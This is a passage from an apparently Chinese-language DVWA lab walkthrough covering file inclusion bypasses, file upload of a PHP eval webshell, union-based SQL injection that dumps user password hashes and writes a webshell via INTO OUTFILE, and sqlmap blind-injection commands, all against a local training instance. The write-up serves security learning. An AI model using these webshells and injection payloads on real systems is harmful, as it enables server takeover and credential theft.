</span></code></pre></td></tr></table></div></div><p>使用 <code>str_replace</code> 函数进行过滤是很不安全的，因为可以使用双写绕过。例如，我们包含 <code>hthttp://tp://xx</code> 时, <code>str_replace</code> 函数只会过滤一个 <code>http://</code> ，所以最终还是会包含到 <a href=http://xx/ target=_blank rel="noopener noreffer"><code>http://xx</code></a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>&lt;http://127.0.0.1/vulnerabilities/fi/?page=htthttp://p://127.0.0.1/phpinfo.php&gt;  
</code></pre></td></tr></table></div></div><h3 id=high-3>high</h3><p>添加了如下过滤:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=c1>// Input validation  
</span><span class=c1></span><span class=k>if</span><span class=p>(</span> <span class=o>!</span><span class=nx>fnmatch</span><span class=p>(</span> <span class=s2>&#34;file*&#34;</span><span class=p>,</span> <span class=nv>$file</span> <span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nv>$file</span> <span class=o>!=</span> <span class=s2>&#34;include.php&#34;</span> <span class=p>)</span> <span class=p>{</span>  
    <span class=c1>// This isn&#39;t the page we want!  
</span><span class=c1></span>    <span class=k>echo</span> <span class=s2>&#34;ERROR: File not found!&#34;</span><span class=p>;</span>  
    <span class=k>exit</span><span class=p>;</span>  
<span class=p>}</span>  
</code></pre></td></tr></table></div></div><p>fnmatch() 函数根据指定的模式来匹配文件名或字符串。</p><p>对包含的文件名进行了限制，必须为 file* 或者 include.php ，否则会提示Error：File not found。</p><p>可以利用 file 协议进行绕过。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=o>&lt;</span><span class=nx>http</span><span class=o>://</span><span class=mf>127.0</span><span class=o>.</span><span class=mf>0.1</span><span class=o>/</span><span class=nx>vulnerabilities</span><span class=o>/</span><span class=nx>fi</span><span class=o>/?</span><span class=nx>page</span><span class=o>=</span><span class=nx>file</span><span class=o>:///</span><span class=nx>D</span><span class=o>:</span><span class=nx>\\phpStudy\\PHPTutorial\\WWW\\DVWA1\\vulnerabilities\\fi\\test</span><span class=o>.</span><span class=nx>txt</span><span class=o>&gt;</span>  
</code></pre></td></tr></table></div></div><h2 id=文件上传>文件上传</h2><p>文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。</p><h3 id=low-4>low</h3><p>没有对文件做任何限制，可以直接上传webshell</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>  
<span class=o>@</span><span class=nx>evaltest</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;zxl&#39;</span><span class=p>]);</span>  
<span class=cp>?&gt;</span><span class=err>  
</span></code></pre></td></tr></table></div></div><p>将上述内容写入1.php文件进行上传</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/13.png data-srcset="/images/dvwa/13.png, /images/dvwa/13.png 1.5x, /images/dvwa/13.png 2x" data-sizes=auto alt=/images/dvwa/13.png title=/images/dvwa/13.png></p><p>使用中国菜刀连接</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/14.png data-srcset="/images/dvwa/14.png, /images/dvwa/14.png 1.5x, /images/dvwa/14.png 2x" data-sizes=auto alt=/images/dvwa/14.png title=/images/dvwa/14.png></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/15.png data-srcset="/images/dvwa/15.png, /images/dvwa/15.png 1.5x, /images/dvwa/15.png 2x" data-sizes=auto alt=/images/dvwa/15.png title=/images/dvwa/15.png></p><h3 id=medium-4>medium</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=c1>// File information  
</span><span class=c1></span>    <span class=nv>$uploaded_name</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span> <span class=s1>&#39;uploaded&#39;</span> <span class=p>][</span> <span class=s1>&#39;name&#39;</span> <span class=p>];</span>  
    <span class=nv>$uploaded_type</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span> <span class=s1>&#39;uploaded&#39;</span> <span class=p>][</span> <span class=s1>&#39;type&#39;</span> <span class=p>];</span>  
    <span class=nv>$uploaded_size</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span> <span class=s1>&#39;uploaded&#39;</span> <span class=p>][</span> <span class=s1>&#39;size&#39;</span> <span class=p>];</span>  
  
    <span class=c1>// Is it an image?  
</span><span class=c1></span>    <span class=k>if</span><span class=p>(</span> <span class=p>(</span> <span class=nv>$uploaded_type</span> <span class=o>==</span> <span class=s2>&#34;image/jpeg&#34;</span> <span class=o>||</span> <span class=nv>$uploaded_type</span> <span class=o>==</span> <span class=s2>&#34;image/png&#34;</span> <span class=p>)</span> <span class=o>&amp;&amp;</span>  
        <span class=p>(</span> <span class=nv>$uploaded_size</span> <span class=o>&lt;</span> <span class=mi>100000</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>  
  
        <span class=c1>// Can we move the file to the upload folder?  
</span><span class=c1></span>        <span class=k>if</span><span class=p>(</span> <span class=o>!</span><span class=nx>move_uploaded_file</span><span class=p>(</span> <span class=nv>$_FILES</span><span class=p>[</span> <span class=s1>&#39;uploaded&#39;</span> <span class=p>][</span> <span class=s1>&#39;tmp_name&#39;</span> <span class=p>],</span> <span class=nv>$target_path</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>  
            <span class=c1>// No  
</span><span class=c1></span>            <span class=k>echo</span> <span class=s1>&#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;</span><span class=p>;</span>  
        <span class=p>}</span>  
        <span class=k>else</span> <span class=p>{</span>  
            <span class=c1>// Yes!  
</span><span class=c1></span>            <span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;</span><span class=si>{</span><span class=nv>$target_path</span><span class=si>}</span><span class=s2> succesfully uploaded!&lt;/pre&gt;&#34;</span><span class=p>;</span>  
        <span class=p>}</span>  
    <span class=p>}</span>  
</code></pre></td></tr></table></div></div><p>对文件类型进行了限制，只接受图片格式的文件。可以用burp进行文件名的修改</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/16.png data-srcset="/images/dvwa/16.png, /images/dvwa/16.png 1.5x, /images/dvwa/16.png 2x" data-sizes=auto alt=/images/dvwa/16.png title=/images/dvwa/16.png></p><p>将这个1.jpg修改成1.php即可，后续步骤相同。</p><h3 id=high-4>high</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=c1>// File information  
</span><span class=c1></span>    <span class=nv>$uploaded_name</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span> <span class=s1>&#39;uploaded&#39;</span> <span class=p>][</span> <span class=s1>&#39;name&#39;</span> <span class=p>];</span>  
    <span class=nv>$uploaded_ext</span>  <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span> <span class=nv>$uploaded_name</span><span class=p>,</span> <span class=nx>strrpos</span><span class=p>(</span> <span class=nv>$uploaded_name</span><span class=p>,</span> <span class=s1>&#39;.&#39;</span> <span class=p>)</span> <span class=o>+</span> <span class=mi>1</span><span class=p>);</span>  
    <span class=nv>$uploaded_size</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span> <span class=s1>&#39;uploaded&#39;</span> <span class=p>][</span> <span class=s1>&#39;size&#39;</span> <span class=p>];</span>  
    <span class=nv>$uploaded_tmp</span>  <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span> <span class=s1>&#39;uploaded&#39;</span> <span class=p>][</span> <span class=s1>&#39;tmp_name&#39;</span> <span class=p>];</span>  
  
    <span class=c1>// Is it an image?  
</span><span class=c1></span>    <span class=k>if</span><span class=p>(</span> <span class=p>(</span> <span class=nx>strtolower</span><span class=p>(</span> <span class=nv>$uploaded_ext</span> <span class=p>)</span> <span class=o>==</span> <span class=s2>&#34;jpg&#34;</span> <span class=o>||</span> <span class=nx>strtolower</span><span class=p>(</span> <span class=nv>$uploaded_ext</span> <span class=p>)</span> <span class=o>==</span> <span class=s2>&#34;jpeg&#34;</span> <span class=o>||</span> <span class=nx>strtolower</span><span class=p>(</span> <span class=nv>$uploaded_ext</span> <span class=p>)</span> <span class=o>==</span> <span class=s2>&#34;png&#34;</span> <span class=p>)</span> <span class=o>&amp;&amp;</span>  
        <span class=p>(</span> <span class=nv>$uploaded_size</span> <span class=o>&lt;</span> <span class=mi>100000</span> <span class=p>)</span> <span class=o>&amp;&amp;</span>  
        <span class=nx>getimagesize</span><span class=p>(</span> <span class=nv>$uploaded_tmp</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>  
</code></pre></td></tr></table></div></div><p>直接对文件名进行限制。</p><p>使用edjpgcom.exe工具制作图片马即可。</p><h2 id=sql注入>SQL注入</h2><h3 id=low-5>low</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>  
  
<span class=k>if</span><span class=p>(</span> <span class=nx>isset</span><span class=p>(</span> <span class=nv>$_REQUEST</span><span class=p>[</span> <span class=s1>&#39;Submit&#39;</span> <span class=p>]</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>  
    <span class=c1>// Get input  
</span><span class=c1></span>    <span class=nv>$id</span> <span class=o>=</span> <span class=nv>$_REQUEST</span><span class=p>[</span> <span class=s1>&#39;id&#39;</span> <span class=p>];</span>  
  
    <span class=c1>// Check database  
</span><span class=c1></span>    <span class=nv>$query</span>  <span class=o>=</span> <span class=s2>&#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;</span><span class=si>$id</span><span class=s2>&#39;;&#34;</span><span class=p>;</span>  
    <span class=nv>$result</span> <span class=o>=</span> <span class=nx>mysqli_query</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>],</span>  <span class=nv>$query</span> <span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span> <span class=s1>&#39;&lt;pre&gt;&#39;</span> <span class=o>.</span> <span class=p>((</span><span class=nx>is_object</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>]))</span> <span class=o>?</span> <span class=nx>mysqli_error</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>])</span> <span class=o>:</span> <span class=p>((</span><span class=nv>$___mysqli_res</span> <span class=o>=</span> <span class=nx>mysqli_connect_error</span><span class=p>())</span> <span class=o>?</span> <span class=nv>$___mysqli_res</span> <span class=o>:</span> <span class=k>false</span><span class=p>))</span> <span class=o>.</span> <span class=s1>&#39;&lt;/pre&gt;&#39;</span> <span class=p>);</span>  
  
    <span class=c1>// Get results  
</span><span class=c1></span>    <span class=k>while</span><span class=p>(</span> <span class=nv>$row</span> <span class=o>=</span> <span class=nx>mysqli_fetch_assoc</span><span class=p>(</span> <span class=nv>$result</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>  
        <span class=c1>// Get values  
</span><span class=c1></span>        <span class=nv>$first</span> <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span><span class=s2>&#34;first_name&#34;</span><span class=p>];</span>  
        <span class=nv>$last</span>  <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span><span class=s2>&#34;last_name&#34;</span><span class=p>];</span>  
  
        <span class=c1>// Feedback for end user  
</span><span class=c1></span>        <span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;ID: </span><span class=si>{</span><span class=nv>$id</span><span class=si>}</span><span class=s2>&lt;br /&gt;First name: </span><span class=si>{</span><span class=nv>$first</span><span class=si>}</span><span class=s2>&lt;br /&gt;Surname: </span><span class=si>{</span><span class=nv>$last</span><span class=si>}</span><span class=s2>&lt;/pre&gt;&#34;</span><span class=p>;</span>  
    <span class=p>}</span>  
  
    <span class=nx>mysqli_close</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>]);</span>  
<span class=p>}</span>  
  
<span class=cp>?&gt;</span><span class=err>  
</span></code></pre></td></tr></table></div></div><p>没有任何过滤直接手工注入</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback># 判断是否为注入  
?id=1&#39; or &#39;1&#39;=&#39;1  
?id=1&#39; or &#39;1&#39;=&#39;2  
  
# 判断字段长度（2 正常，3 异常）  
?id=1&#39; order by 2 --   
?id=1&#39; order by 3 --  
  
# 确定回显点  
?id=1&#39; union select 111,222 --   
  
# 用户名和数据库名称  
?id=1&#39; union select user(),database() --   
-- output：admin@localhost、dvwa  
  
# 查看当前用户和 mysql 版本  
?id=1&#39; union select current_user(),version() --   
-- output：First name: admin@%、 5.5.47-0ubuntu0.14.04.1  
  
# 爆表名  
?id=1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema =database() --   
-- output：guestbook,users  
  
# 爆列名（两种办法，加引号或者十六进制编码）  
?id=1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name =0x7573657273 --   
?id=1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name =&#39;users&#39; --   
-- output：user_id,first_name,last_name,user,password,avatar,last_login,failed_login  
  
# 爆字段名  
?id=1&#39; union select group_concat(user_id,first_name,last_name),group_concat(password) from users  --   
?id=1&#39; union select null,concat_ws(char(32,58,32),user,password) from users --   
?id=1&#39; union select user,password from users --   
-- output：admin/5f4dcc3b5aa765d61d8327deb882cf99  
  
# 读文件  
?id=1&#39; union select 1,load_file(&#39;//tmp//key&#39;) --   
  
# 写文件()  
?id=1&#39; and &#39;1&#39;=&#39;2&#39; union select null,&#39;hello&#39; into outfile &#39;/tmp/test01&#39; --  
?id=999&#39; union select null,&#39;hello&#39; into outfile &#39;/tmp/test02&#39; --  
?id=999&#39;  union select null,&#39;&lt;?php @evaltest($_POST[&#34;gg&#34;]); ?&gt;&#39; into outfile &#39;/tmp/test03&#39; --    
?id=999&#39; union select 1,0x3C3F70687020406576616C28245F504F53545B27636D64275D293B3F3E into outfile &#39;//tmp//test04&#39; --  
</code></pre></td></tr></table></div></div><h3 id=medium-5>medium</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>  
  
<span class=k>if</span><span class=p>(</span> <span class=nx>isset</span><span class=p>(</span> <span class=nv>$_POST</span><span class=p>[</span> <span class=s1>&#39;Submit&#39;</span> <span class=p>]</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>  
    <span class=c1>// Get input  
</span><span class=c1></span>    <span class=nv>$id</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span> <span class=s1>&#39;id&#39;</span> <span class=p>];</span>  
  
    <span class=nv>$id</span> <span class=o>=</span> <span class=nx>mysqli_real_escape_string</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>],</span> <span class=nv>$id</span><span class=p>);</span>  
  
    <span class=nv>$query</span>  <span class=o>=</span> <span class=s2>&#34;SELECT first_name, last_name FROM users WHERE user_id = </span><span class=si>$id</span><span class=s2>;&#34;</span><span class=p>;</span>  
    <span class=nv>$result</span> <span class=o>=</span> <span class=nx>mysqli_query</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>],</span> <span class=nv>$query</span><span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span> <span class=s1>&#39;&lt;pre&gt;&#39;</span> <span class=o>.</span> <span class=nx>mysqli_error</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>])</span> <span class=o>.</span> <span class=s1>&#39;&lt;/pre&gt;&#39;</span> <span class=p>);</span>  
  
    <span class=c1>// Get results  
</span><span class=c1></span>    <span class=k>while</span><span class=p>(</span> <span class=nv>$row</span> <span class=o>=</span> <span class=nx>mysqli_fetch_assoc</span><span class=p>(</span> <span class=nv>$result</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>  
        <span class=c1>// Display values  
</span><span class=c1></span>        <span class=nv>$first</span> <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span><span class=s2>&#34;first_name&#34;</span><span class=p>];</span>  
        <span class=nv>$last</span>  <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span><span class=s2>&#34;last_name&#34;</span><span class=p>];</span>  
  
        <span class=c1>// Feedback for end user  
</span><span class=c1></span>        <span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;ID: </span><span class=si>{</span><span class=nv>$id</span><span class=si>}</span><span class=s2>&lt;br /&gt;First name: </span><span class=si>{</span><span class=nv>$first</span><span class=si>}</span><span class=s2>&lt;br /&gt;Surname: </span><span class=si>{</span><span class=nv>$last</span><span class=si>}</span><span class=s2>&lt;/pre&gt;&#34;</span><span class=p>;</span>  
    <span class=p>}</span>  
  
<span class=p>}</span>  
  
<span class=c1>// This is used later on in the index.php page  
</span><span class=c1>// Setting it here so we can close the database connection in here like in the rest of the source scripts  
</span><span class=c1></span><span class=nv>$query</span>  <span class=o>=</span> <span class=s2>&#34;SELECT COUNT(*) FROM users;&#34;</span><span class=p>;</span>  
<span class=nv>$result</span> <span class=o>=</span> <span class=nx>mysqli_query</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>],</span>  <span class=nv>$query</span> <span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span> <span class=s1>&#39;&lt;pre&gt;&#39;</span> <span class=o>.</span> <span class=p>((</span><span class=nx>is_object</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>]))</span> <span class=o>?</span> <span class=nx>mysqli_error</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>])</span> <span class=o>:</span> <span class=p>((</span><span class=nv>$___mysqli_res</span> <span class=o>=</span> <span class=nx>mysqli_connect_error</span><span class=p>())</span> <span class=o>?</span> <span class=nv>$___mysqli_res</span> <span class=o>:</span> <span class=k>false</span><span class=p>))</span> <span class=o>.</span> <span class=s1>&#39;&lt;/pre&gt;&#39;</span> <span class=p>);</span>  
<span class=nv>$number_of_rows</span> <span class=o>=</span> <span class=nx>mysqli_fetch_row</span><span class=p>(</span> <span class=nv>$result</span> <span class=p>)[</span><span class=mi>0</span><span class=p>];</span>  
  
<span class=nx>mysqli_close</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>]);</span>  
<span class=cp>?&gt;</span><span class=err>  
</span></code></pre></td></tr></table></div></div><p>添加了<code>mysqli_real_escape_string</code>函数对特殊字符进行转义同时内容来自POST请求。转义的字符有：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-Text data-lang=Text>\\x00  
\\n  
\\r  
\\  
&#39;  
&#34;  
\\x1a  
</code></pre></td></tr></table></div></div><p>数字型注入，不用使用上述特殊字符，使用<code>hackbar</code>进行<code>post</code>即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-Text data-lang=Text># 判断注入点  
id=1 and 1=1 &amp;Submit=Submit  
id=1 and 1=2 &amp;Submit=Submit  
  
# 爆数据  
id=1 union select user,password from users&amp;Submit=Submit  
</code></pre></td></tr></table></div></div><h3 id=high-5>high</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>  
  
<span class=k>if</span><span class=p>(</span> <span class=nx>isset</span><span class=p>(</span> <span class=nv>$_SESSION</span> <span class=p>[</span> <span class=s1>&#39;id&#39;</span> <span class=p>]</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>  
    <span class=c1>// Get input  
</span><span class=c1></span>    <span class=nv>$id</span> <span class=o>=</span> <span class=nv>$_SESSION</span><span class=p>[</span> <span class=s1>&#39;id&#39;</span> <span class=p>];</span>  
  
    <span class=c1>// Check database  
</span><span class=c1></span>    <span class=nv>$query</span>  <span class=o>=</span> <span class=s2>&#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;</span><span class=si>$id</span><span class=s2>&#39; LIMIT 1;&#34;</span><span class=p>;</span>  
    <span class=nv>$result</span> <span class=o>=</span> <span class=nx>mysqli_query</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>],</span> <span class=nv>$query</span> <span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span> <span class=s1>&#39;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#39;</span> <span class=p>);</span>  
  
    <span class=c1>// Get results  
</span><span class=c1></span>    <span class=k>while</span><span class=p>(</span> <span class=nv>$row</span> <span class=o>=</span> <span class=nx>mysqli_fetch_assoc</span><span class=p>(</span> <span class=nv>$result</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>  
        <span class=c1>// Get values  
</span><span class=c1></span>        <span class=nv>$first</span> <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span><span class=s2>&#34;first_name&#34;</span><span class=p>];</span>  
        <span class=nv>$last</span>  <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span><span class=s2>&#34;last_name&#34;</span><span class=p>];</span>  
  
        <span class=c1>// Feedback for end user  
</span><span class=c1></span>        <span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;ID: </span><span class=si>{</span><span class=nv>$id</span><span class=si>}</span><span class=s2>&lt;br /&gt;First name: </span><span class=si>{</span><span class=nv>$first</span><span class=si>}</span><span class=s2>&lt;br /&gt;Surname: </span><span class=si>{</span><span class=nv>$last</span><span class=si>}</span><span class=s2>&lt;/pre&gt;&#34;</span><span class=p>;</span>  
    <span class=p>}</span>  
  
    <span class=p>((</span><span class=nx>is_null</span><span class=p>(</span><span class=nv>$___mysqli_res</span> <span class=o>=</span> <span class=nx>mysqli_close</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>])))</span> <span class=o>?</span> <span class=k>false</span> <span class=o>:</span> <span class=nv>$___mysqli_res</span><span class=p>);</span>          
<span class=p>}</span>  
  
<span class=cp>?&gt;</span><span class=err>  
</span></code></pre></td></tr></table></div></div><p>添加<code>limit 1</code>限制输出数量，使用注释可以忽略掉</p><p>MySQL 注释 <code>#</code> 或 <code>--</code> （空格）其他与low相同</p><h2 id=sql盲注>SQL盲注</h2><p>用sqlmap做sql盲注</p><h3 id=low-6>low</h3><p>没做任何防护</p><ul><li>判断注入点</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash>python sqlmap.py -u <span class=s2>&#34;&lt;http://localhost/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&gt;&#34;</span> --cookie<span class=o>=</span><span class=s2>&#34;security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4&#34;</span> --batch  
</code></pre></td></tr></table></div></div><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/17.png data-srcset="/images/dvwa/17.png, /images/dvwa/17.png 1.5x, /images/dvwa/17.png 2x" data-sizes=auto alt=/images/dvwa/17.png title=/images/dvwa/17.png></p><ul><li>获取数据库名称</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash>python sqlmap.py -u <span class=s2>&#34;&lt;http://localhost/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&gt;&#34;</span> --cookie<span class=o>=</span><span class=s2>&#34;security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4&#34;</span> --batch --dbs  
</code></pre></td></tr></table></div></div><ul><li>获取当前连接的数据库</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
